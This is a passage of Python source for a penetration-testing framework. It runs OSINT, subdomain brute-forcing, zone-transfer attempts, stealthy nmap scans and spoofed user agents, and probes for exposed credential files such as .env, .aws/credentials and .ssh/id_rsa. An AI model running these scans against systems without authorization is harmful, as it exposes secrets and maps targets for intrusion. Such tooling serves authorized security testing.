#!/usr/bin/env python3
"""
RECONX v4.0 — Professional Penetration Testing Framework
Created by: Amith Krishna MK
"""
import asyncio, aiohttp, subprocess, socket, json, os, sys, re
import argparse, datetime, random, time, concurrent.futures
import ipaddress, ssl, hashlib, base64
from pathlib import Path
from urllib.parse import urljoin, urlparse, quote

try:
    import dns.resolver; DNS_OK = True
except ImportError:
    DNS_OK = False
try:
    import requests
    requests.packages.urllib3.disable_warnings()
    REQ_OK = True
except ImportError:
    REQ_OK = False
try:
    from bs4 import BeautifulSoup; BS4_OK = True
except ImportError:
    BS4_OK = False
try:
    from colorama import Fore, Style, init
    init(autoreset=True)
    R=Fore.RED; G=Fore.GREEN; Y=Fore.YELLOW; C=Fore.CYAN
    M=Fore.MAGENTA; B=Fore.BLUE; W=Fore.WHITE; RS=Style.RESET_ALL; BD=Style.BRIGHT
except ImportError:
    R=G=Y=C=M=B=W=RS=BD=""

BANNER = f"""
{C}{BD}
██████╗ ███████╗ ██████╗ ██████╗ ███╗   ██╗██╗  ██╗
██╔══██╗██╔════╝██╔════╝██╔═══██╗████╗  ██║╚██╗██╔╝
██████╔╝█████╗  ██║     ██║   ██║██╔██╗ ██║ ╚███╔╝
██╔══██╗██╔══╝  ██║     ██║   ██║██║╚██╗██║ ██╔██╗
██║  ██║███████╗╚██████╗╚██████╔╝██║ ╚████║██╔╝ ██╗
╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝  ╚═╝{RS}

{Y}     Professional Penetration Testing Framework v4.0{RS}
{G}              Created by  Amith Krishna MK{RS}
{M}  OSINT · Recon · CVE/RCE · SQLi · XSS · LFI · SSRF{RS}
{M}  SSTI · XXE · GraphQL · S3 · WAF · CISA KEV · Nuclei{RS}
{R}  ⚠  Authorized penetration testing ONLY. Use responsibly.{RS}
"""

UA_POOL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
    "curl/8.5.0",
]
def ua(): return random.choice(UA_POOL)

def log(level, msg):
    ts = datetime.datetime.now().strftime("%H:%M:%S")
    icons = {
        "info":    f"{C}[*]{RS}", "success": f"{G}[+]{RS}",
        "warn":    f"{Y}[!]{RS}", "error":   f"{R}[-]{RS}",
        "section": f"{M}[»]{RS}", "vuln":    f"{R}{BD}[VULN]{RS}",
        "rce":     f"{R}{BD}[RCE!!]{RS}", "secret": f"{R}{BD}[SECRET]{RS}",
        "sqli":    f"{R}{BD}[SQLi]{RS}", "xss":    f"{Y}{BD}[XSS]{RS}",
        "lfi":     f"{R}{BD}[LFI]{RS}", "cors":   f"{Y}{BD}[CORS]{RS}",
        "ssrf":    f"{R}{BD}[SSRF]{RS}", "ssti":   f"{R}{BD}[SSTI]{RS}",
        "xxe":     f"{R}{BD}[XXE]{RS}",  "link":   f"{B}{BD}[LINK]{RS}",
        "waf":     f"{Y}{BD}[WAF]{RS}",  "cloud":  f"{C}{BD}[CLOUD]{RS}",
        "s3":      f"{Y}{BD}[S3]{RS}",   "kev":    f"{R}{BD}[KEV!!]{RS}",
        "proto":   f"{R}{BD}[PROTO]{RS}","smuggle": f"{R}{BD}[SMUGGLE]{RS}",
        "graphql": f"{M}{BD}[GQL]{RS}",
    }
    print(f"  {icons.get(level,'[?]')} {BD}{ts}{RS}  {msg}")

def section(title):
    print(f"\n{C}{'═'*70}{RS}")
    print(f"  {M}{BD}{title}{RS}")
    print(f"{C}{'═'*70}{RS}")

def run_cmd(cmd, timeout=180):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return r.stdout.strip(), r.stderr.strip(), r.returncode
    except subprocess.TimeoutExpired:
        return "", "Timeout", 1
    except Exception as e:
        return "", str(e), 1

def tool_ok(name):
    o, _, rc = run_cmd(f"which {name}")
    return rc == 0 and bool(o)

def resolve_ip(host):
    try: return socket.gethostbyname(host)
    except: return None

def jitter(b=0.2, v=0.3): time.sleep(b + random.uniform(0, v))

def safe_get(url, timeout=8, **kw):
    if not REQ_OK: return None
    try:
        return requests.get(url, timeout=timeout, verify=False,
                            headers={"User-Agent": ua()}, **kw)
    except: return None

# ═══════════════════════════════════════════════════════════════════
# FINDINGS STORE
# ═══════════════════════════════════════════════════════════════════
FINDINGS = []
SORD = {"critical":0,"high":1,"medium":2,"low":3,"info":4,"unknown":5}

def add_finding(ftype, severity, host="", detail="", **kw):
    f = {"type":ftype,"severity":severity,"host":host,"detail":detail,
         "ts":datetime.datetime.now().isoformat(),**kw}
    FINDINGS.append(f)
    return f

# ═══════════════════════════════════════════════════════════════════
# MODULE 1 — OSINT
# ═══════════════════════════════════════════════════════════════════
def osint_whois(domain):
    out, _, rc = run_cmd(f"whois {domain} 2>/dev/null", 15)
    data = {}
    if rc == 0 and out:
        for line in out.splitlines():
            for key in ["Registrar","Creation Date","Expiry Date","Name Server","Registrant Email","Registrant Org"]:
                if key.lower() in line.lower() and ":" in line:
                    val = line.split(":",1)[-1].strip()
                    if val: data.setdefault(key,[]).append(val)
    return data

def osint_shodan(domain, api_key=None):
    results = {}
    ip = resolve_ip(domain)
    if not ip or not REQ_OK: return results
    r = safe_get(f"https://internetdb.shodan.io/{ip}")
    if r and r.status_code == 200:
        d = r.json(); results["internetdb"] = d
        for v in d.get("vulns",[]): log("vuln",f"Shodan: {ip} → {v}"); add_finding("shodan_vuln","high",host=ip,detail=v,cve_id=v)
        if d.get("ports"): log("success",f"Shodan ports on {ip}: {d['ports']}")
    if api_key and ip:
        r = safe_get(f"https://api.shodan.io/shodan/host/{ip}?key={api_key}")
        if r and r.status_code == 200: results["full"] = r.json()
    return results

def osint_wayback(domain):
    if not REQ_OK: return []
    r = safe_get(f"http://web.archive.org/cdx/search/cdx?url={domain}/*&output=json&limit=100&fl=original&collapse=urlkey")
    if r and r.status_code == 200:
        try: return list(set([row[0] for row in r.json()[1:] if row]))[:60]
        except: pass
    return []

def osint_emailharvest(domain):
    emails = set()
    for path in ["/contact","/about","/team","/support","/",""]:
        r = safe_get(f"https://{domain}{path}")
        if r: emails.update(re.findall(r'[a-zA-Z0-9._%+-]+@'+re.escape(domain), r.text))
    return list(emails)

def crt_sh_enum(domain):
    if not REQ_OK: return []
    r = safe_get(f"https://crt.sh/?q=%.{domain}&output=json", timeout=20)
    if r and r.status_code == 200:
        subs = set()
        try:
            for e in r.json():
                for n in e.get("name_value","").splitlines():
                    n = n.strip().lstrip("*.")
                    if n.endswith(domain) and n != domain and " " not in n: subs.add(n.lower())
        except: pass
        return list(subs)
    return []

def osint_google_dorks(domain):
    return [
        f'site:{domain} filetype:pdf OR filetype:xls OR filetype:doc',
        f'site:{domain} inurl:admin OR inurl:login OR inurl:dashboard OR inurl:panel',
        f'site:{domain} inurl:config OR inurl:backup OR inurl:.env OR inurl:database',
        f'site:{domain} "password" OR "passwd" OR "secret" OR "api_key"',
        f'site:{domain} inurl:api OR inurl:swagger OR inurl:graphql OR inurl:rest',
        f'site:{domain} inurl:upload OR inurl:shell OR inurl:cmd',
        f'site:github.com "{domain}" password OR secret OR token OR key',
        f'site:pastebin.com OR site:paste.ee "{domain}"',
        f'"@{domain}" filetype:sql OR filetype:csv',
        f'site:{domain} ext:log OR ext:bak OR ext:old OR ext:swp',
        f'site:{domain} intext:"sql syntax" OR intext:"ORA-" OR intext:"mysql_fetch"',
        f'site:{domain} intext:"Warning: include" OR intext:"Fatal error"',
        f'inurl:"{domain}" intext:"index of"',
    ]

def osint_ipinfo(ip):
    r = safe_get(f"https://ipinfo.io/{ip}/json")
    return r.json() if r and r.status_code == 200 else {}

# ═══════════════════════════════════════════════════════════════════
# MODULE 2 — SUBDOMAIN ENUMERATION
# ═══════════════════════════════════════════════════════════════════
WORDLIST = [
    "www","mail","ftp","admin","api","dev","staging","test","blog","shop","vpn",
    "remote","portal","dashboard","beta","app","m","mobile","static","cdn","media",
    "assets","secure","login","auth","oauth","sso","git","gitlab","jenkins","jira",
    "confluence","support","help","docs","status","monitor","metrics","grafana",
    "kibana","elastic","smtp","pop","imap","ns1","ns2","mx","webmail","internal",
    "corp","intranet","uat","qa","pre-prod","db","database","redis","mongo","mysql",
    "postgres","backup","old","new","v2","demo","sandbox","s3","storage","files",
    "upload","download","img","images","api2","api-v2","rest","graphql","ws",
    "websocket","push","notify","hooks","webhook","k8s","kubernetes","docker",
    "registry","vault","consul","prometheus","alertmanager","loki","sonar","nexus",
    "dev2","test2","stage","preprod","prod","production","live","mail2","smtp2",
    "vpn2","proxy","gateway","cloud","manage","mgmt","cp","control","panel",
    "ns3","ns4","mx2","autodiscover","autoconfig","exchange","owa","sharepoint",
    "office","teams","crm","erp","hr","fw","firewall","router","server","ww2",
]

async def dns_brute_async(domain, wordlist):
    found = {}
    sem = asyncio.Semaphore(150)
    async def check(sub):
        fqdn = f"{sub}.{domain}"
        async with sem:
            try:
                loop = asyncio.get_event_loop()
                ip = await loop.run_in_executor(None, resolve_ip, fqdn)
                if ip: return fqdn, ip
            except: pass
        return None
    results = await asyncio.gather(*[check(s) for s in wordlist], return_exceptions=True)
    for r in results:
        if r and not isinstance(r, Exception): found[r[0]] = r[1]
    return found

def enumerate_subdomains(domain, wordlist=None):
    section("PHASE 2 — Subdomain Enumeration")
    wl = wordlist or WORDLIST
    all_subs = {}
    if tool_ok("subfinder"):
        log("info","subfinder running...")
        out,_,rc = run_cmd(f"subfinder -d {domain} -silent -timeout 30",60)
        if rc == 0 and out:
            for s in out.splitlines():
                s = s.strip()
                if s: all_subs[s] = resolve_ip(s) or "unresolved"
            log("success",f"subfinder → {len(all_subs)} subdomains")
    if tool_ok("amass"):
        log("info","amass passive...")
        out,_,rc = run_cmd(f"amass enum -passive -d {domain} -timeout 60",90)
        if rc == 0 and out:
            for s in out.splitlines():
                s = s.strip()
                if s and s.endswith(domain): all_subs.setdefault(s, resolve_ip(s) or "unresolved")
    log("info","crt.sh certificate transparency...")
    for s in crt_sh_enum(domain):
        if s not in all_subs: all_subs[s] = resolve_ip(s) or "unresolved"
    log("info",f"Async DNS brute ({len(wl)} words, 150 concurrent)...")
    brute = asyncio.run(dns_brute_async(domain, wl))
    for fqdn,ip in brute.items(): all_subs.setdefault(fqdn, ip)
    all_subs[domain] = resolve_ip(domain) or "unresolved"
    log("success",f"Total: {BD}{len(all_subs)}{RS} subdomains")
    for sub,ip in sorted(all_subs.items()):
        col = G if ip != "unresolved" else Y
        print(f"    {col}  {sub:<52} → {ip}{RS}")
    return all_subs

# ═══════════════════════════════════════════════════════════════════
# MODULE 3 — DNS DEEP ANALYSIS
# ═══════════════════════════════════════════════════════════════════
def dns_enum(domain):
    section("PHASE 3 — DNS Deep Analysis")
    records = {}
    if DNS_OK:
        resolver = dns.resolver.Resolver()
        resolver.timeout = 5; resolver.lifetime = 8
        for rtype in ["A","AAAA","MX","NS","TXT","SOA","CNAME","SRV","CAA"]:
            try:
                ans = resolver.resolve(domain, rtype)
                records[rtype] = [str(r) for r in ans]
                log("success",f"{rtype:<6} → {', '.join(records[rtype][:2])}")
            except: pass
        try:
            ans = resolver.resolve(f"_dmarc.{domain}","TXT")
            records["DMARC"] = [str(r) for r in ans]
            log("success",f"DMARC  → {records['DMARC'][0][:60]}")
        except: pass
    else:
        for rtype in ["A","AAAA","MX","NS","TXT","SOA"]:
            out,_,rc = run_cmd(f"dig +short {domain} {rtype}")
            if rc == 0 and out:
                records[rtype] = [l.strip() for l in out.splitlines() if l.strip()]
                log("success",f"{rtype:<6} → {', '.join(records[rtype][:2])}")
    for ns in records.get("NS",[])[:3]:
        ns = ns.rstrip(".")
        out,_,rc = run_cmd(f"dig @{ns} {domain} AXFR +noall +answer",10)
        if rc == 0 and out and len(out) > 100 and "Transfer failed" not in out:
            log("vuln",f"ZONE TRANSFER SUCCESS on {ns}!")
            add_finding("zone_transfer","critical",host=domain,detail=f"AXFR success on {ns}")
    txt = records.get("TXT",[])
    spf = [t for t in txt if "v=spf1" in t.lower()]
    if not spf:
        log("warn","No SPF — email spoofing possible!"); add_finding("missing_spf","medium",host=domain,detail="No SPF record")
    elif "+all" in str(spf):
        log("vuln","Weak SPF: +all permits any sender!"); add_finding("weak_spf","high",host=domain,detail=str(spf))
    if not records.get("DMARC"):
        log("warn","No DMARC — phishing risk!"); add_finding("missing_dmarc","medium",host=domain,detail="No _dmarc record")
    return records

# ═══════════════════════════════════════════════════════════════════
# MODULE 4 — ASYNC HTTP PROBING + TECH FINGERPRINT
# ═══════════════════════════════════════════════════════════════════
TECH_SIGS = {
    "WordPress":["wp-content","wp-includes","wordpress","wp-json"],
    "Joomla":["joomla","/components/com_","/templates/"],
    "Drupal":["drupal","sites/default/files","drupal.js"],
    "Magento":["magento","mage/","varien"],
    "Shopify":["shopify","myshopify.com"],
    "Laravel":["laravel_session","laravel","illuminate"],
    "Django":["csrfmiddlewaretoken","django","wsgi"],
    "Rails":["_rails_","x-runtime","x-request-id"],
    "Express":["express","x-powered-by: express"],
    "Spring Boot":["x-application-context","whitelabel error","spring"],
    "ASP.NET":["__viewstate","aspnetcore","x-aspnet-version"],
    "PHP":["x-powered-by: php","phpsessid"],
    "Nginx":["nginx"],"Apache":["apache"],"IIS":["microsoft-iis"],
    "Cloudflare":["cf-ray","cf-cache-status","cloudflare"],
    "React":["__react","react-root","_next/static"],
    "Next.js":["_next/","x-powered-by: next.js"],
    "Vue":["__vue__","nuxt","v-app"],
    "Angular":["ng-version","angular","zone.js"],
    "GraphQL":["application/graphql","__typename","graphiql"],
    "Elasticsearch":["x-elastic-product","elasticsearch"],
    "Tomcat":["apache-coyote","tomcat"],
    "Struts":["struts","apache struts"],
    "Jenkins":["x-jenkins","jenkins"],
    "Kubernetes":["kubernetes","k8s"],
    "Node.js":["x-powered-by: express","node.js"],
}
SEC_HEADERS = ["Content-Security-Policy","X-Frame-Options","Strict-Transport-Security",
               "X-Content-Type-Options","Referrer-Policy","Permissions-Policy","X-XSS-Protection"]

def detect_tech(headers, body):
    tech = []
    h = {k.lower():v.lower() for k,v in headers.items()}
    combined = f"{h.get('server','')} {h.get('x-powered-by','')} {body[:8000]}".lower()
    for name,sigs in TECH_SIGS.items():
        for sig in sigs:
            if sig.lower() in combined:
                if name not in tech: tech.append(name)
                break
    return tech

async def probe_host_async(session, host, sem):
    async with sem:
        for scheme in ["https","http"]:
            url = f"{scheme}://{host}"
            try:
                hdrs = {"User-Agent":ua(),"Accept":"*/*"}
                async with session.get(url, headers=hdrs,
                                       timeout=aiohttp.ClientTimeout(total=9),
                                       allow_redirects=True, ssl=False) as resp:
                    body = await resp.text(errors="replace")
                    title = ""
                    m = re.search(r"<title[^>]*>(.*?)</title>",body,re.I|re.S)
                    if m: title = re.sub(r'\s+',' ',m.group(1)).strip()[:80]
                    rh = dict(resp.headers)
                    missing = [h for h in SEC_HEADERS if h.lower() not in {k.lower() for k in rh}]
                    tech = detect_tech(rh, body)
                    inputs = re.findall(r'<input[^>]+name=["\']([^"\']+)["\']',body,re.I)
                    forms_count = len(re.findall(r'<form',body,re.I))
                    return host, {
                        "url":str(resp.url),"status":resp.status,"title":title,
                        "server":rh.get("Server",""),"powered_by":rh.get("X-Powered-By",""),
                        "content_length":len(body),"missing_security_headers":missing,
                        "tech_stack":tech,"scheme":scheme,"forms":forms_count,
                        "input_params":inputs[:20],"links_found":len(re.findall(r'href=["\']',body,re.I)),
                        "response_headers":dict(list(rh.items())[:25]),
                        "body_snippet":body[:3000],
                    }
            except: continue
    return host, None

async def http_probe_all(subdomains):
    section("PHASE 4 — Async HTTP Probing & Tech Fingerprinting")
    if tool_ok("httpx"):
        log("info","httpx binary detected...")
        tmp = "/tmp/reconx_hosts.txt"
        with open(tmp,"w") as f: f.write("\n".join(subdomains.keys()))
        out,_,rc = run_cmd(f"httpx -l {tmp} -title -status-code -tech-detect -silent -timeout 6 -random-agent",120)
        if rc == 0 and out:
            results = {}
            for line in out.splitlines():
                results[line] = {"raw_httpx":line}
                log("success",line)
            return results
    hosts = [h for h,ip in subdomains.items() if ip != "unresolved"]
    log("info",f"Probing {len(hosts)} hosts (async, 40 concurrent)...")
    conn = aiohttp.TCPConnector(ssl=False, limit=40)
    sem = asyncio.Semaphore(40)
    results = {}
    async with aiohttp.ClientSession(connector=conn) as session:
        tasks = [probe_host_async(session,h,sem) for h in hosts]
        for coro in asyncio.as_completed(tasks):
            host,res = await coro
            if res:
                results[host] = res
                sc = res["status"]
                col = G if sc==200 else (Y if sc in (301,302,403,401) else R)
                tech = f"{C}[{','.join(res['tech_stack'][:3])}]{RS}" if res["tech_stack"] else ""
                miss = f"{R}⚠{RS}" if res["missing_security_headers"] else f"{G}✓{RS}"
                print(f"    {col}[{sc}]{RS}  {host:<38}  {BD}{res['title'][:28]:<28}{RS}  {tech}  {miss}")
    log("success",f"Live services: {BD}{len(results)}{RS}")
    return results

# ═══════════════════════════════════════════════════════════════════
# MODULE 5 — CMS SCANNER
# ═══════════════════════════════════════════════════════════════════
WP_PLUGINS = ["contact-form-7","yoast-seo","woocommerce","elementor","wordfence",
              "akismet","jetpack","wp-super-cache","advanced-custom-fields",
              "wp-file-manager","revslider","loginizer","limit-login-attempts-reloaded",
              "wp-fastest-cache","social-warfare","wp-mail-smtp","bbpress"]

def scan_wordpress(base, host):
    r = safe_get(f"{base}/feed/")
    if r:
        ver = re.search(r'<generator>.*?WordPress[/ ](\d+\.\d+[\.\d]*)',r.text,re.I)
        if ver: log("success",f"WordPress v{ver.group(1)} on {host}")
    r = safe_get(f"{base}/wp-json/wp/v2/users")
    if r and r.status_code == 200:
        try:
            users = r.json()
            if isinstance(users,list):
                for u in users[:5]:
                    log("vuln",f"WP user exposed: {u.get('name','?')} / {u.get('slug','?')}")
                    add_finding("wp_user_enum","medium",host=host,detail=f"User: {u.get('name')} slug:{u.get('slug')}")
        except: pass
    r = safe_get(f"{base}/xmlrpc.php")
    if r and r.status_code == 200 and "XML-RPC" in r.text:
        log("vuln","xmlrpc.php ENABLED — brute-force & amplification possible!")
        add_finding("wp_xmlrpc","high",host=host,detail="xmlrpc.php accessible")
    for path in ["/wp-config.php.bak","/wp-config.php~","/wp-config.php.old","/wp-config.txt"]:
        r = safe_get(f"{base}{path}")
        if r and r.status_code == 200 and ("DB_PASSWORD" in r.text or "DB_NAME" in r.text):
            log("rce",f"wp-config BACKUP EXPOSED: {base}{path}!")
            add_finding("wp_config_exposed","critical",host=host,detail=f"wp-config at {path}")
    r = safe_get(f"{base}/wp-content/debug.log")
    if r and r.status_code == 200 and len(r.text) > 50:
        log("vuln",f"debug.log exposed ({len(r.text)}B)")
        add_finding("wp_debug_log","medium",host=host,detail=r.text[:200])
    for plugin in WP_PLUGINS:
        r = safe_get(f"{base}/wp-content/plugins/{plugin}/readme.txt")
        if r and r.status_code == 200:
            ver = re.search(r'Stable tag:\s*([0-9.]+)',r.text,re.I)
            log("success",f"WP plugin: {plugin} v{ver.group(1) if ver else '?'}")
    if tool_ok("wpscan"):
        log("info","wpscan running...")
        out,_,rc = run_cmd(f"wpscan --url {base} --no-update --format json 2>/dev/null",120)
        if rc == 0 and out:
            try:
                ws = json.loads(out)
                for v in ws.get("vulnerabilities",[]):
                    log("vuln",f"wpscan: {v.get('title','?')}")
                    add_finding("wpscan_vuln","high",host=host,detail=v.get("title",""))
            except: pass

def scan_joomla(base, host):
    for path,desc in [("/administrator/","Joomla admin panel"),
                       ("/administrator/manifests/files/joomla.xml","Joomla version file"),
                       ("/README.txt","Joomla README")]:
        r = safe_get(f"{base}{path}")
        if r and r.status_code == 200:
            log("vuln",f"{desc}: {base}{path}")
            add_finding("joomla_exposure","medium",host=host,detail=f"{desc} at {path}")

def scan_drupal(base, host):
    r = safe_get(f"{base}/CHANGELOG.txt")
    if r and r.status_code == 200:
        ver = re.search(r'Drupal (\d+\.\d+)',r.text)
        if ver:
            log("vuln",f"Drupal version exposed: {ver.group(1)}")
            add_finding("drupal_version","medium",host=host,detail=f"Drupal {ver.group(1)}")

def cms_scan_all(http_results):
    section("PHASE 5 — CMS Detection & Vulnerability Scanning")
    for host,result in http_results.items():
        if not isinstance(result,dict) or "raw_httpx" in result: continue
        tech = result.get("tech_stack",[])
        scheme = result.get("scheme","https")
        base = f"{scheme}://{host}"
        if "WordPress" in tech: scan_wordpress(base, host)
        if "Joomla" in tech: scan_joomla(base, host)
        if "Drupal" in tech: scan_drupal(base, host)
        if "Struts" in tech:
            log("rce",f"Apache Struts on {host} — S2-045/S2-057 RCE risk!")
            add_finding("struts_rce_risk","critical",host=host,detail="Apache Struts — CVE-2017-5638",cve_id="CVE-2017-5638")
        if "Jenkins" in tech:
            log("rce",f"Jenkins on {host} — CVE-2024-23897 CLI RCE!")
            add_finding("jenkins_rce_risk","critical",host=host,detail="Jenkins — CVE-2024-23897",cve_id="CVE-2024-23897")

# ═══════════════════════════════════════════════════════════════════
# MODULE 6 — SENSITIVE PATH DISCOVERY
# ═══════════════════════════════════════════════════════════════════
SENSITIVE_PATHS = [
    "/.env","/.env.local","/.env.production","/.env.backup","/config.php",
    "/config.yml","/config.json","/settings.py","/database.yml","/.htpasswd",
    "/web.config","/appsettings.json","/secrets.json","/.git/HEAD","/.git/config",
    "/.gitignore","/.svn/entries","/backup.zip","/backup.tar.gz","/backup.sql",
    "/db.sql","/dump.sql","/admin","/admin/","/administrator","/admin/login",
    "/manage","/cpanel","/phpmyadmin","/pma","/adminer.php","/adminer",
    "/phpinfo.php","/info.php","/actuator","/actuator/env","/actuator/health",
    "/actuator/mappings","/actuator/heapdump","/actuator/threaddump","/actuator/beans",
    "/swagger-ui.html","/swagger-ui/","/api-docs","/openapi.json","/openapi.yaml",
    "/v1/api-docs","/v2/api-docs","/api/swagger.json","/graphql","/graphiql",
    "/access.log","/error.log","/debug.log","/app.log","/storage/logs/laravel.log",
    "/.aws/credentials","/.aws/config","/.s3cfg","/server-status","/server-info",
    "/robots.txt","/sitemap.xml","/package.json","/.npmrc","/.dockerenv",
    "/docker-compose.yml","/shell.php","/cmd.php","/c99.php","/r57.php",
    "/wp-login.php","/wp-admin/","/xmlrpc.php","/wp-json/wp/v2/users",
    "/.well-known/security.txt","/crossdomain.xml","/clientaccesspolicy.xml",
    "/server.xml","/web.xml","/WEB-INF/web.xml","/META-INF/MANIFEST.MF",
    "/.bash_history","/.ssh/id_rsa","/.ssh/authorized_keys","/id_rsa",
    "/private.key","/server.key","/certificate.pem",
]

def path_discovery(http_results):
    section("PHASE 6 — Sensitive Path Discovery")
    hosts = [h for h,v in http_results.items() if isinstance(v,dict) and "raw_httpx" not in v][:25]
    def check(args):
        host,path = args
        r = http_results.get(host,{})
        scheme = r.get("scheme","https") if isinstance(r,dict) else "https"
        url = f"{scheme}://{host}{path}"
        try:
            resp = requests.get(url,timeout=5,verify=False,headers={"User-Agent":ua()},allow_redirects=False)
            if resp.status_code in (200,301,302,403,500):
                sev = "critical" if resp.status_code == 200 and any(
                    x in path for x in [".env","config","backup","sql","admin","git","key","secret","credentials","shell","cmd","ssh","rsa"]) else "medium" if resp.status_code == 200 else "low"
                if sev in ("critical","medium"):
                    add_finding("sensitive_path",sev,host=host,detail=f"[{resp.status_code}] {url}",url=url)
                return {"url":url,"status":resp.status_code,"size":len(resp.content),"path":path,"host":host,"severity":sev}
        except: pass
        return None
    combos = [(h,p) for h in hosts for p in SENSITIVE_PATHS]
    log("info",f"Checking {len(combos)} paths across {len(hosts)} hosts...")
    findings = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=40) as ex:
        for r in ex.map(check, combos):
            if r:
                findings.append(r)
                col = R if r["severity"] == "critical" else Y
                log("vuln" if r["severity"] == "critical" else "warn",
                    f"{col}[{r['status']}]{RS}  {r['url']}  ({r['size']}B)")
    return findings

# ═══════════════════════════════════════════════════════════════════
# MODULE 7 — PORT SCANNING
# ═══════════════════════════════════════════════════════════════════
RISKY = {
    "ftp":"Cleartext — credentials sniffable",
    "telnet":"Cleartext remote — extremely dangerous",
    "smb":"EternalBlue/ransomware vector",
    "rdp":"BlueKeep RCE, brute-force target",
    "vnc":"Often unauth or weak password",
    "redis":"Unauthenticated by default — RCE via SLAVEOF",
    "mongodb":"Often unauthenticated — full DB access",
    "elasticsearch":"Data exposure — often unauth",
    "memcached":"Always unauthenticated — DDoS amplification",
    "docker":"Container escape → root",
    "rsync":"Often allows unauth file read",
    "mysql":"Check remote root access",
    "postgres":"Check remote superuser",
    "jenkins":"RCE via script console",
    "jmx":"Java JMX — MBean RCE",
    "rmi":"Java RMI deserialization RCE",
    "etcd":"K8s secrets — often unauthenticated",
    "kubernetes":"Cluster takeover",
    "zookeeper":"Often unauthenticated",
}

def nmap_scan(ip, scan_type="default"):
    profiles = {
        "stealth":f"nmap -sS -T2 -f --open --randomize-hosts -p 21,22,23,25,53,80,110,143,443,445,3306,3389,5432,6379,8080,8443 {ip}",
        "quick":  f"nmap -T4 -F --open {ip}",
        "default":f"nmap -T4 -sV -sC --open -p 21,22,23,25,53,80,110,143,389,443,445,993,995,1433,1521,3306,3389,4848,5432,5900,5984,6379,7001,8080,8443,8888,9000,9200,9300,11211,27017,50070 {ip}",
        "full":   f"nmap -T4 -sV -sC --open -p- {ip}",
        "vuln":   f"nmap -T4 -sV --script=vuln,auth,exploit,default --open -p 21,22,23,25,53,80,443,445,3306,3389,5432,6379,8080 {ip}",
    }
    log("info",f"nmap [{scan_type}] → {ip}")
    out,_,rc = run_cmd(profiles.get(scan_type,profiles["default"]),300)
    ports = []
    if rc == 0 and out:
        for line in out.splitlines():
            line = line.strip()
            if "/tcp" in line or "/udp" in line:
                parts = line.split()
                if len(parts) >= 3:
                    svc = parts[2].lower()
                    ver = " ".join(parts[3:]) if len(parts) > 3 else ""
                    risk = RISKY.get(svc,"")
                    ports.append({"port_proto":parts[0],"state":parts[1],"service":svc,"version":ver,"risk":risk})
                    if risk: add_finding("risky_service","critical" if svc in ("redis","docker","jenkins","etcd","kubernetes") else "high",host=ip,detail=f"{svc} on {parts[0]}: {risk}")
            if "VULNERABLE" in line or "CVE-" in line:
                add_finding("nmap_nse","high",host=ip,detail=line)
    return ports, out

def port_scan_all(subdomains, scan_type="default"):
    section("PHASE 7 — Advanced Port Scanning")
    if not tool_ok("nmap"):
        log("error","nmap not found → sudo apt install nmap")
        return {}
    ip_map = {}
    for host,ip in subdomains.items():
        if ip and ip != "unresolved":
            try: ipaddress.ip_address(ip); ip_map.setdefault(ip,[]).append(host)
            except: pass
    log("info",f"Scanning {len(ip_map)} unique IPs ({scan_type})...")
    results = {}
    for ip,hosts in ip_map.items():
        ports,raw = nmap_scan(ip, scan_type)
        results[ip] = {"hosts":hosts,"ports":ports,"raw":raw}
        if ports:
            log("success",f"{ip} — {len(ports)} ports:")
            for p in ports:
                col = R if p["risk"] else G
                risk = f"  {R}⚠ {p['risk'][:50]}{RS}" if p["risk"] else ""
                print(f"    {col}  {p['port_proto']:<12} {p['state']:<8} {p['service']:<14} {p['version'][:30]}{RS}{risk}")
        else: log("warn",f"{ip} — filtered/closed")
    return results

# ═══════════════════════════════════════════════════════════════════
# MODULE 8 — CVE/RCE + CISA KEV
# ═══════════════════════════════════════════════════════════════════
KNOWN_RCE = {
    "log4":("CVE-2021-44228","Log4Shell JNDI injection RCE","critical"),
    "struts":("CVE-2017-5638","Apache Struts S2-045 RCE","critical"),
    "spring":("CVE-2022-22965","Spring4Shell RCE","critical"),
    "shellshock":("CVE-2014-6271","Shellshock Bash RCE","critical"),
    "heartbleed":("CVE-2014-0160","Heartbleed OpenSSL disclosure","high"),
    "eternalblue":("CVE-2017-0144","EternalBlue SMB RCE","critical"),
    "bluekeep":("CVE-2019-0708","BlueKeep RDP RCE","critical"),
    "zerologon":("CVE-2020-1472","Zerologon priv esc","critical"),
    "proxylogon":("CVE-2021-26855","ProxyLogon Exchange RCE","critical"),
    "confluenc":("CVE-2022-26134","Confluence OGNL RCE","critical"),
    "jenkins":("CVE-2024-23897","Jenkins CLI RCE","critical"),
    "weblogic":("CVE-2020-14882","WebLogic Auth Bypass RCE","critical"),
    "jboss":("CVE-2017-12149","JBoss Deserialization RCE","critical"),
    "drupal":("CVE-2018-7600","Drupalgeddon2 RCE","critical"),
    "php":("CVE-2024-4577","PHP CGI Argument Injection RCE","critical"),
    "openssh":("CVE-2024-6387","regreSSHion OpenSSH RCE","critical"),
    "moveit":("CVE-2023-34362","MOVEit SQLi RCE","critical"),
    "citrix":("CVE-2023-3519","Citrix Bleed RCE","critical"),
    "f5":("CVE-2023-46747","F5 BIG-IP Auth Bypass","critical"),
    "ivanti":("CVE-2024-21887","Ivanti Connect Secure RCE","critical"),
}

def check_cisa_kev(cve_id):
    if not REQ_OK: return False
    try:
        r = safe_get("https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json",timeout=15)
        if r and r.status_code == 200:
            for v in r.json().get("vulnerabilities",[]):
                if v.get("cveID") == cve_id: return True
    except: pass
    return False

def cve_rce_scan(port_results, http_results):
    section("PHASE 8 — CVE/RCE Correlation + CISA KEV")
    for host,result in http_results.items():
        if not isinstance(result,dict) or "raw_httpx" in result: continue
        for tech in result.get("tech_stack",[]):
            t = tech.lower()
            for keyword,(cve_id,desc,sev) in KNOWN_RCE.items():
                if keyword in t:
                    log("rce",f"{R}{BD}{cve_id}{RS}  {desc}  ({tech} on {host})")
                    add_finding("rce_fingerprint",sev,host=host,detail=desc,cve_id=cve_id)
    for ip,data in port_results.items():
        for p in data.get("ports",[]):
